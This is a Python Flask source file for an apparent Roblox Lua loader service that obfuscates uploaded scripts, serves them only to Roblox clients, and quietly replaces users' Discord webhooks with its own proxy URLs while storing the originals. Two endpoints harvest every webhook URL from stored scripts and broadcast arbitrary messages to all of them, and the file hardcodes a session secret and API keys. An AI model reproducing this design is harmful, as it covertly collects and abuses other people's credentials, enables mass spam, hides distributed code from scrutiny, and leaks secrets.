from flask import Flask, request, jsonify, render_template, session, send_from_directory
import os
import re
import requests
import uuid
import json
from datetime import datetime, timedelta  # ✅ Missing import
from supabase import create_client

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "0x4AAAAAABZAawAfCPe3waqvkG4X_MxVenY")

# test
# Supabase configuration
SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://ikxxvgflnpfyncnaqfxx.supabase.co")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlreHh2Z2ZsbnBmeW5jbmFxZnh4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYxOTE3NTMsImV4cCI6MjA2MTc2Nzc1M30.YiF46ggItUYuKLfdD_6oOxq2xGX7ac6yqqtEGeM_dg8")  # ⚠️ You may want to remove hardcoded key for security
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# Obfuscator API Config
OBFUSCATOR_API_KEY = os.environ.get("OBFUSCATOR_API_KEY", "bf4f5e8e-291b-2a5f-dc7f-2b5fabdeab1eb69f")
NEW_SCRIPT_URL = "https://api.luaobfuscator.com/v1/obfuscator/newscript"
OBFUSCATE_URL = "https://api.luaobfuscator.com/v1/obfuscator/obfuscate"

def sanitize_filename(name):
    return re.sub(r"[^a-zA-Z0-9_-]", "", name)

def cleanup_inactive_users():
    cutoff = (datetime.utcnow() - timedelta(minutes=2)).isoformat()
    supabase.table("active_users").delete().lt("last_seen", cutoff).execute()

def obfuscate_lua_code(code):
    try:
        new_script_headers = {
            "apikey": OBFUSCATOR_API_KEY,
            "content-type": "text"
        }
        session_response = requests.post(NEW_SCRIPT_URL, headers=new_script_headers, data=code)
        session_data = session_response.json()
        if not session_data.get("sessionId"):
            return {"error": "Failed to create session"}, False

        session_id = session_data["sessionId"]

        obfuscate_headers = {
            "apikey": OBFUSCATOR_API_KEY,
            "sessionId": session_id,
            "content-type": "application/json"
        }

        obfuscation_options = {
            "MinifiyAll": True,
            "Virtualize": True,
            "Seed": str(uuid.uuid4().int)[:8],
            "CustomPlugins": {
                "CachedEncryptStrings": True,
                "CallRetAssignment": True,
                "ControlFlowFlattenV2AllBlocks": True,
                "DummyFunctionArgs": True,
                "FuncChopper": True,
                "Minifier2": True,
                "WowPacker": True
            }
        }

        obfuscate_response = requests.post(OBFUSCATE_URL, headers=obfuscate_headers, data=json.dumps(obfuscation_options))
        obfuscate_data = obfuscate_response.json()
        if not obfuscate_data.get("code"):
            return {"error": "Failed to obfuscate code"}, False

        return {"obfuscated_code": obfuscate_data["code"]}, True

    except Exception as e:
        return {"error": str(e)}, False

@app.before_request
def update_active_user():
    if "user_id" not in session:
        session["user_id"] = str(uuid.uuid4())

    session_id = session["user_id"]
    now = datetime.utcnow().isoformat()

    supabase.table("active_users").upsert({
        "session_id": session_id,
        "last_seen": now
    }).execute()

@app.route('/')
def home():
    return render_template("index.html")

@app.route('/api/send', methods=['POST'])
def api_send():
    data = request.get_json()
    message = data.get("text", "").strip()

    if not message:
        return jsonify({"status": "error", "message": "Missing 'text' field in JSON body."}), 400

    # Regex to extract webhook URLs inside quotes like: Webhook = "https://discord.com/api/webhooks/..."
    webhook_pattern = re.compile(r'Webhook\s*=\s*"?(https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+)"?')

    try:
        response = supabase.table("scripts").select("unobfuscated").execute()
        script_rows = response.data  # already a list of dicts

        if not script_rows:
            return jsonify({"status": "error", "message": "No scripts found."}), 404

        webhooks_sent = set()
        all_webhooks_found = []

        for script in script_rows:
            unobfuscated = script.get("unobfuscated", "")
            found_hooks = webhook_pattern.findall(unobfuscated)

            for hook in found_hooks:
                hook = hook.strip()
                all_webhooks_found.append(hook)

                if hook not in webhooks_sent:
                    try:
                        res = requests.post(hook, json={"content": message}, timeout=5)
                        if res.status_code == 204:
                            webhooks_sent.add(hook)
                    except requests.exceptions.RequestException:
                        continue  # Ignore failed requests

        return jsonify({
            "status": "success",
            "message": f"Found {len(all_webhooks_found)} webhook(s), Sent to {len(webhooks_sent)} successfully."
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/trax/create', methods=['POST'])
def create_trax():
    data = request.get_json()
    script = data.get("content") if data else None

    if not script:
        return "No content provided", 400

    try:
        insert_result = supabase.table("items").insert({
            "content": script,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        if insert_result.status_code != 201:
            print("Supabase insert error:", insert_result)
            return "Failed to save script", 500

        script_id = insert_result.data[0]["id"]

        return jsonify({
            "link": f"https://luaris.onrender.com/api/trax/raw/{script_id}"
        }), 200

    except Exception as e:
        print("Server error:", str(e))
        return "Internal Server Error", 500

@app.route('/api/trax/raw/<uuid:item_id>', methods=['GET'])
def view_trax_raw(item_id):
    result = supabase.table("items").select("content").eq("id", str(item_id)).execute()

    if not result.data:
        return "Not found", 404

    return result.data[0]["content"], 200, {'Content-Type': 'text/plain'}
    
@app.route('/generate', methods=['POST'])
def generate():
    data = request.json
    script_content = data.get("script", "").strip()
    custom_name = sanitize_filename(data.get("name", "").strip())

    if not script_content:
        return jsonify({"error": "No script provided"}), 400

    obfuscation_result, success = obfuscate_lua_code(script_content)

    if not success:
        return jsonify(obfuscation_result), 500

    obfuscated_script = obfuscation_result["obfuscated_code"]
    script_name = custom_name if custom_name else uuid.uuid4().hex

    existing_scripts = supabase.table("scripts").select("name").eq("name", script_name).execute()
    if existing_scripts.data:
        counter = 1
        while True:
            new_name = f"{script_name}{counter}"
            name_check = supabase.table("scripts").select("name").eq("name", new_name).execute()
            if not name_check.data:
                script_name = new_name
                break
            counter += 1

    supabase.table("scripts").insert({
        "name": script_name,
        "content": obfuscated_script,
        "unobfuscated": script_content,
        "created_at": datetime.utcnow().isoformat()  # ✅ Fixed: "now()" should be ISO datetime string
    }).execute()

    return jsonify({"link": f"{request.host_url}luaris/files/scripts/loaders/{script_name}"}), 200

@app.route('/api/botghost/generate', methods=['POST'])
def botghost_generate():
    data = request.get_json()
    script_content = data.get("script", "").strip()
    custom_name = sanitize_filename(data.get("name", "").strip())

    if not script_content:
        return jsonify({"status": "error", "message": "No script provided"}), 400

    # Detect Discord webhook
    webhook_match = re.search(r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+', script_content)
    if webhook_match:
        webhook_url = webhook_match.group(0)

        # Generate an ID for proxy
        webhook_id = str(uuid.uuid4())

        # Save real webhook to Supabase
        supabase.table("webhooks").insert({
            "id": webhook_id,
            "webhook_url": webhook_url,
            "created_at": datetime.utcnow().isoformat()
        }).execute()

        # Replace real webhook in script with proxy
        proxy_url = f"{request.host_url}luaris/webhook/{webhook_id}"
        script_content = script_content.replace(webhook_url, proxy_url)

    # Obfuscate the script
    obfuscation_result, success = obfuscate_lua_code(script_content)
    if not success:
        return jsonify({
            "status": "error",
            "message": obfuscation_result.get("error", "Obfuscation failed")
        }), 500

    obfuscated_script = obfuscation_result["obfuscated_code"]
    script_name = custom_name if custom_name else uuid.uuid4().hex

    existing_scripts = supabase.table("scripts").select("name").eq("name", script_name).execute()
    if existing_scripts.data:
        counter = 1
        while True:
            new_name = f"{script_name}{counter}"
            name_check = supabase.table("scripts").select("name").eq("name", new_name).execute()
            if not name_check.data:
                script_name = new_name
                break
            counter += 1

    supabase.table("scripts").insert({
        "name": script_name,
        "content": obfuscated_script,
        "unobfuscated": script_content,
        "created_at": datetime.utcnow().isoformat()
    }).execute()

    return jsonify({
        "status": "success",
        "name": script_name,
        "linkcode": f"{request.host_url}luaris/files/scripts/loaders/{script_name}",
        "obfuscated_code": obfuscated_script
    }), 200

@app.route('/luaris/files/scripts/loaders/<script_name>')
def execute(script_name):
    script_name = sanitize_filename(script_name)
    response = supabase.table("scripts").select("content").eq("name", script_name).execute()

    if response.data:
        user_agent = request.headers.get("User-Agent", "").lower()
        if not ("roblox" in user_agent or "robloxapp" in user_agent):
            return render_template("unauthorized.html"), 403

        supabase.rpc("increment_execution_count").execute()

        return response.data[0]["content"], 200, {'Content-Type': 'text/plain'}

    return 'game.Players.LocalPlayer:Kick("Script Not Found -- Please Regenerate")', 200, {'Content-Type': 'text/plain'}

@app.route('/get-total-executions')
def get_total_executions():
    response = supabase.table("executions").select("count").eq("id", 1).execute()
    if response.data:
        return jsonify({"count": response.data[0]['count']})
    return jsonify({"count": 0})

@app.route('/get-live-users')
def get_live_users():
    cutoff = (datetime.utcnow() - timedelta(seconds=2)).isoformat()

    supabase.table("active_users").delete().lt("last_seen", (datetime.utcnow() - timedelta(seconds=5)).isoformat()).execute()

    response = supabase.table("active_users").select("*").gt("last_seen", cutoff).execute()
    count = len(response.data) if response.data else 0
    return jsonify({"count": count})

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    if "user_id" not in session:
        session["user_id"] = str(uuid.uuid4())

    session_id = session["user_id"]
    now = datetime.utcnow().isoformat()

    supabase.table("active_users").upsert({
        "session_id": session_id,
        "last_seen": now
    }).execute()

    return "", 204

@app.route('/ads.txt')
def ads():
    return send_from_directory('static', 'ads.txt')

@app.route("/oldservers", methods=["GET"])
def oldservers():
    import requests
    from flask import request

    game_id = request.args.get("gameId")
    if not game_id:
        return "Missing GameId", 400

    try:
        url = f"https://games.roblox.com/v1/games/{game_id}/servers/Public?sortOrder=Asc&limit=100"
        res = requests.get(url)
        if res.status_code != 200:
            return "Failed to fetch servers", 500

        data = res.json()
        servers = [
            s for s in data.get("data", [])
            if s.get("playing", 0) > 0
        ]

        if not servers:
            return "No active servers found.", 200

        # Sort by oldest created time
        servers.sort(key=lambda x: x.get("created", ""))

        best_server = servers[0]
        job_id = best_server.get("id")
        server_version = best_server.get("serverVersion", "Unknown")

        return f"Server Job Id - `{job_id}`\nServer Version - {server_version}"

    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/luaris/webhook/<webhook_id>', methods=['POST'])
def proxy_webhook(webhook_id):
    result = supabase.table("webhooks").select("webhook_url").eq("id", webhook_id).execute()
    if not result.data:
        return jsonify({"error": "Webhook not found"}), 404

    webhook_url = result.data[0]["webhook_url"]

    # Forward the JSON payload to the real webhook
    headers = {"Content-Type": "application/json"}
    response = requests.post(webhook_url, headers=headers, json=request.get_json())

    return jsonify({"status": "forwarded", "response_status": response.status_code}), response.status_code

@app.route('/api/botghost/message', methods=['POST'])
def botghost_message():
    data = request.get_json()

    if not data or "text" not in data:
        return jsonify({"status": "error", "message": "Missing 'text' parameter in JSON body."}), 400

    message = data["text"].strip()
    if not message:
        return jsonify({"status": "error", "message": "Empty message."}), 400

    try:
        res = supabase.table("scripts").select("unobfuscated").execute()
    except Exception as e:
        return jsonify({"status": "error", "message": f"Supabase error: {e}"}), 500

    if not res.data:
        return jsonify({"status": "error", "message": "No scripts found."}), 404

    webhook_pattern = r"https:\/\/discord\.com\/api\/webhooks\/[^\s\"']+"
    sent_count = 0
    found_webhooks = set()

    for row in res.data:
        unobfuscated = row.get("unobfuscated", "")
        matches = re.findall(webhook_pattern, unobfuscated)
        for webhook_url in matches:
            webhook_url = webhook_url.strip()
            if webhook_url not in found_webhooks:
                try:
                    response = requests.post(webhook_url, json={"content": message})
                    if response.ok:
                        sent_count += 1
                        found_webhooks.add(webhook_url)
                except Exception as e:
                    print(f"[ERROR] Failed to send to {webhook_url}: {e}")

    return jsonify({
        "status": "success",
        "message_sent": message,
        "sent_to": sent_count,
        "total_unique_webhooks": len(found_webhooks)
    }), 200
    
@app.route('/api/obfuscate', methods=['POST'])
def api_obfuscate():
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400

    script_content = request.json.get("script", "")
    if not script_content:
        return jsonify({"error": "No script provided"}), 400

    obfuscation_result, success = obfuscate_lua_code(script_content)
    if not success:
        return jsonify(obfuscation_result), 500

    return jsonify({"obfuscated_code": obfuscation_result["obfuscated_code"]}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
